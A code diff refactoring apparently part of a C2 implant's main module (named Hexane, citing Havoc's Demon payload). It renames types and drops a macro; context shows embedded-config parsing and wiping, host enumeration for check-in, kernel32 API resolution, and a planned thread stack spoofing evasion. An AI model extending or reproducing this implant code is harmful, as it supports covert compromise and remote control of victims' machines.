@@ -23,8 +23,6 @@ namespace Main {
     UINT8 __attribute__((used, section(".data"))) Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
 
     VOID MainRoutine() {
-        HEXANE;
-
         static int retry = 0;
         // TODO: thread stack spoofing
         do {
@@ -59,9 +57,7 @@ namespace Main {
 
     BOOL EnumSystem() {
         // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
-        HEXANE;
-
-        _stream *out = CreateStreamWithHeaders(TypeCheckin);
+        PACKET *out = CreateStreamWithHeaders(TypeCheckin);
 
         IP_ADAPTER_INFO adapter     = { };
         OSVERSIONINFOW os_version   = { };
@@ -170,9 +166,7 @@ namespace Main {
 
     BOOL ResolveApi() {
         // TODO: create separate ResolveApi for loader and payload
-		HEXANE;
-
-		bool success = true;
+		BOOL success = true;
 		x_assertb(ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
 		x_assertb(ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
 
@@ -316,10 +310,8 @@ namespace Main {
 	}
 
     BOOL ReadConfig() {
-        HEXANE;
-
-        _parser parser  = { };
-        bool success    = true;
+        PARSER parser  = { };
+        BOOL success    = true;
 
         CreateParser(&parser, Config, sizeof(Config));
         MemSet(Config, 0, sizeof(Config));
